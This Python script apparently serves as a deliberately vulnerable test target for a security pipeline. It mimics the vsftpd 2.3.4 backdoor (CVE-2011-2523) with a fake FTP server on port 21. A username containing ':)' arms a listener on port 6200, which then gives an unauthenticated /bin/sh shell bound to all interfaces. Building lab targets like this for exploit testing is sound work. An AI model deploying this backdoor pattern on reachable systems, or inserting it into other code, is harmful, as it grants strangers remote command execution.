#!/usr/bin/env python3
"""
Faithful mimic of the vsftpd 2.3.4 backdoor (CVE-2011-2523), for authorized
local Talon pipeline testing only.

Metasploit's exploit/unix/ftp/vsftpd_234_backdoor:
  1) FTP USER containing ":)" arms the backdoor
  2) Immediately connects to TCP 6200 for a cmd shell (cmd/unix/interact)

So we MUST already be listening on 6200 when the USER arrives (race-free),
but only hand out a shell after arming — matching real malware timing for
the client while remaining MSF-compatible.

No third-party deps; standard library only.
"""
from __future__ import annotations

import os
import socket
import threading


def handle_ftp(conn: socket.socket, arm_event: threading.Event) -> None:
    try:
        conn.sendall(b"220 (vsFTPd 2.3.4)\r\n")
        buf = b""
        while True:
            data = conn.recv(1024)
            if not data:
                break
            buf += data
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                line = line.strip().decode(errors="replace")
                upper = line.upper()
                if upper.startswith("USER ") and ":)" in line:
                    arm_event.set()
                    conn.sendall(b"331 Please specify the password.\r\n")
                elif upper.startswith("USER "):
                    conn.sendall(b"331 Please specify the password.\r\n")
                elif upper.startswith("PASS"):
                    conn.sendall(b"230 Login successful.\r\n")
                elif upper in ("QUIT", "BYE"):
                    conn.sendall(b"221 Goodbye.\r\n")
                    return
                elif upper.startswith("SYST"):
                    conn.sendall(b"215 UNIX Type: L8\r\n")
                elif upper.startswith("FEAT"):
                    conn.sendall(b"211-Features:\r\n211 End\r\n")
                else:
                    conn.sendall(b"500 Unknown command.\r\n")
    except OSError:
        pass
    finally:
        try:
            conn.close()
        except OSError:
            pass


def backdoor_shell(conn: socket.socket) -> None:
    try:
        os.dup2(conn.fileno(), 0)
        os.dup2(conn.fileno(), 1)
        os.dup2(conn.fileno(), 2)
        os.execv("/bin/sh", ["sh"])
    except OSError:
        try:
            conn.close()
        except OSError:
            pass
        os._exit(1)


def serve_ftp(arm_event: threading.Event) -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 21))
    s.listen(32)
    while True:
        try:
            conn, _ = s.accept()
        except OSError:
            break
        threading.Thread(target=handle_ftp, args=(conn, arm_event), daemon=True).start()


def serve_backdoor(arm_event: threading.Event) -> None:
    """
    Always listen on 6200 (so MSF's immediate connect succeeds), but only
    spawn a shell when armed by a smiley USER. Unarmed connections are
    closed immediately.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 6200))
    s.listen(32)
    while True:
        try:
            conn, _ = s.accept()
        except OSError:
            break
        if not arm_event.is_set():
            try:
                conn.close()
            except OSError:
                pass
            continue
        # Consume the arm so each USER :) yields one shell (MSF semantics).
        arm_event.clear()
        pid = os.fork()
        if pid == 0:
            try:
                s.close()
            except OSError:
                pass
            backdoor_shell(conn)
            os._exit(0)
        try:
            conn.close()
        except OSError:
            pass


def main() -> None:
    arm_event = threading.Event()
    threading.Thread(target=serve_ftp, args=(arm_event,), daemon=True).start()
    threading.Thread(target=serve_backdoor, args=(arm_event,), daemon=True).start()
    print(
        "vuln-target: ftp :21 (vsftpd 2.3.4); backdoor :6200 (shell after USER :))",
        flush=True,
    )
    threading.Event().wait()


if __name__ == "__main__":
    main()
